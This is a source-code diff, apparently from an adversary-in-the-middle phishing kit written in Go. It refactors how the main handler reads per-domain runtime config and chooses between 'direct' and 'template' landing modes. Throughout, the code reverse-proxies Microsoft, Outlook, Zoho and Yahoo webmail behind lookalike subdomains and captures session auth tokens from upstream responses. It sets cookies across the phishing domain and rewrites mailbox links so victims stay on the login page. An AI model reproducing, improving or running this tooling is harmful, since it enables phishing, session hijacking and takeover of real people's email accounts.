@@ -158,12 +158,10 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 	r = withDomainContext(r, role, baseDomain)
 	host := strings.ToLower(stripPort(r.Host))
 
-	configMu.RLock()
-	domainState := activeConfig.Domains[baseDomain]
-	configMu.RUnlock()
+	runtimeDomain, runtimeDomainOK := getRuntimeDomainConfig(baseDomain)
 
-	if domainState != nil && !domainState.Enabled {
-		log.Printf("[⛔] BLOCKED: Domain '%s' is globally disabled", baseDomain)
+	if runtimeDomainOK && !runtimeDomain.Enabled {
+		log.Printf("[⛔] BLOCKED: Domain '%s' is globally disabled by runtime config", baseDomain)
 		blockResponse(w)
 		return
 	}
@@ -219,17 +217,31 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		w.Header().Set("Set-Cookie", fmt.Sprintf(
 			"%s=%s; Path=/; Domain=.%s; Max-Age=3600; HttpOnly; Secure; SameSite=None",
 			sessionMgr.cookieName, session.ID, baseDomain))
+		landingMode := "template"
+		templateName := "portal"
 
-		configMu.RLock()
-		state := activeConfig.Domains[baseDomain]
-		configMu.RUnlock()
+		if runtimeDomainOK {
+			mode := strings.ToLower(strings.TrimSpace(runtimeDomain.Landing.Mode))
 
-		templateName := "none"
-		if state != nil && state.LandingTemplate != "" {
-			templateName = state.LandingTemplate
+			switch mode {
+			case "direct", "template":
+				landingMode = mode
+			default:
+				log.Printf(
+					"[config] Invalid landing mode '%s' for %s; falling back to template",
+					mode,
+					baseDomain,
+				)
+			}
+
+			if selected := strings.TrimSpace(runtimeDomain.Landing.TemplateID); selected != "" {
+				templateName = selected
+			} else if selected := strings.TrimSpace(runtimeDomain.Landing.SelectedTemplateID); selected != "" {
+				templateName = selected
+			}
 		}
 
-		if templateName == "none" {
+		if landingMode == "direct" {
 			if !hasTracking || tracking == nil || tracking.Provider == "" {
 				log.Printf("[⛔] BLOCKED: MODE A direct route requires valid tracking payload with provider")
 				http.NotFound(w, r)
@@ -261,9 +273,9 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 				proxySub := customRole + "." + baseDomain
 
 				customTarget := &Target{
-					Name:        "Custom Webmail (" + providerVal + " - " + u.Host + ")",
-					EntryPrefix: customRole,
-					Subdomains:  map[string]string{customRole: u.Host},
+					Name:              "Custom Webmail (" + providerVal + " - " + u.Host + ")",
+					EntryPrefix:       customRole,
+					Subdomains:        map[string]string{customRole: u.Host},
 					ReverseSubdomains: map[string]string{u.Host: customRole},
 					ModifyMimes: map[string]bool{
 						"text/html": true, "application/json": true,
@@ -291,12 +303,12 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 				if destPath == "" {
 					destPath = "/"
 				}
-				
+
 				dest = fmt.Sprintf("https://%s%s", proxySub, destPath)
 				if u.RawQuery != "" {
 					dest += "?" + u.RawQuery
 				}
-				
+
 				if cid != "" {
 					if strings.Contains(dest, "?") {
 						dest += "&cid=" + cid
@@ -374,7 +386,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 	}
 
 	session := sessionMgr.GetOrCreate(r, baseDomain)
-	
+
 	// ══════════════════════════════════════════════════════════
 	// SESSION TARGET SWITCHING
 	// Prevents cross-target session hijacking when users switch providers
@@ -445,7 +457,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 	upstream, ok := target.HostMapFor(baseDomain)[host]
 	if !ok {
 		log.Printf("[⚠️ ROUTING] Host '%s' not explicitly mapped. Using dynamic fallback.", host)
-		
+
 		// Smart fallbacks based on hostname patterns
 		if strings.Contains(host, "office.") || strings.Contains(host, "outlook.") {
 			upstream = "www.office.com"
@@ -483,7 +495,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 
 		// ✅ Corrected to 3 arguments to match tokens.go
 		captureAuthTokens(resp, session, target)
-		
+
 		err := rewriteResponse(resp, r, session, target)
 
 		mime := strings.Split(resp.Header.Get("Content-Type"), ";")[0]
@@ -511,7 +523,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			bodyBytes, readErr := io.ReadAll(resp.Body)
 			if readErr == nil {
 				resp.Body.Close()
-				
+
 				// ✅ Inlined logic to replace the missing getUpstreamRootURL function
 				targetURL := "https://login.microsoftonline.com" // Safe default fallback
 				if url, ok := terminationURLs[session.TargetName]; ok {
@@ -519,14 +531,14 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 				} else if session.TargetName != "" {
 					targetURL = "https://" + baseDomainOf(r) + "/"
 				}
-				
+
 				// Aggressively replace common mailbox redirect URIs with the login page URL
 				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://mail.zoho.com/zm/"), []byte(targetURL))
 				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://mail.zoho.com"), []byte(targetURL))
 				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://outlook.live.com/mail"), []byte(targetURL))
 				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://www.office.com"), []byte(targetURL))
 				bodyBytes = bytes.ReplaceAll(bodyBytes, []byte("https://mail.yahoo.com"), []byte(targetURL))
-				
+
 				resp.Body = io.NopCloser(bytes.NewReader(bodyBytes))
 				resp.ContentLength = int64(len(bodyBytes))
 				resp.Header.Set("Content-Length", fmt.Sprintf("%d", len(bodyBytes)))
@@ -551,14 +563,14 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 // e.g., "yahoo.remits.me" -> "remits.me"
 func extractBaseDomain(host string) string {
 	host = strings.ToLower(stripPort(host))
-	
+
 	parts := strings.Split(host, ".")
-	
+
 	// If it's a standard domain (sub.domain.com), take the last two parts
 	if len(parts) >= 2 {
 		return parts[len(parts)-2] + "." + parts[len(parts)-1]
 	}
-	
+
 	return host
 }
 
